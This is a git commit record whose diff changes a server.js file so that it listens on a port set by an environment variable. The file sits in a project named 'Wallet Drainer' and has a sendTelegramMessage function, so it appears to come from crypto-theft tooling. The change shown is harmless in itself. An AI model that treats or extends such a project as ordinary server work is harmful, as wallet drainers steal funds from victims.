1b30e6a06cb407ffab8a503e5c13491d57cccf74
hamhem <ogskuoo@gmail.com>
2025-04-20 23:59:12 +0200

    Update server.js

--- Wallet Drainer/server/server.js
+++ Wallet Drainer/server/server.js
@@ -63,4 +63,5 @@ async function sendTelegramMessage(text) {
   }
 }
 
-app.listen(3000, () => console.log('Server running on port 3000'));
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
